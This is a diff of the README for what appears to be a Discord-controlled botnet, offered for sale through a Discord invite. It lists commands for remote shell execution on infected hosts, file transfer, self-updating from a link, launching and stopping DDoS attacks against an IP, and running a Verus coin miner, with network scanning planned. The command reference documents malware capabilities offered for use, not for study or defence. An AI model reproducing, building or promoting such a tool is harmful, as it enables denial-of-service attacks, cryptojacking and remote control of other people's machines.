@@ -11,26 +11,21 @@
 # Soon
 * Zmap entire network scan
 * Nmap local network scan
-* !update command
 
 # Bot Commands
-* !sessions               # List open sessions
-* !kill                   # Close sessions
-* !shell < cmd >          # Run command and if output is not large send as text if large just send log
-* !download < link >      # Upload file to discord
-* !upload < file_name >   # Download file
-* !ddos < ip >            # Start DDoS Attack
-* !stopddos               # Stop DDoS Attack
-* !miner < wallet >       # Start Verus coin miner
-* !stopminer              # Stop miner
+* !sessions                       # List open sessions
+* !kill                           # Close session
+* !shell < cmd >                  # Run command
+* !download < link >              # Upload file to Discord
+* !upload < link > < file_name >  # Download file
+* !update < link > < file_name >  # Update script
+* !ddos < ip >                    # Start DDoS Attack
+* !stopddos                       # Stop DDoS Attack
+* !miner < wallet >               # Start Verus coin miner
+* !stopminer                      # Stop miner
 
 # Self Commands
-* !kill.< ip >                   # Close session
-* !shell.< ip > < cmd >          # Run command and if output is not large send as text if large just send log
-* !ddos.< ip > < ip >            # Start DDoS Attack
-* !stopddos.< ip >               # Stop DDoS Attack
-* !miner.< ip > < wallet >       # Start Verus coin miner
-* !stopminer.< ip >              # Stop miner
+
 
 # Credits: batu.sh#9675
 https://discord.gg/vCdPTjD6rZ - Buy? Dm me.
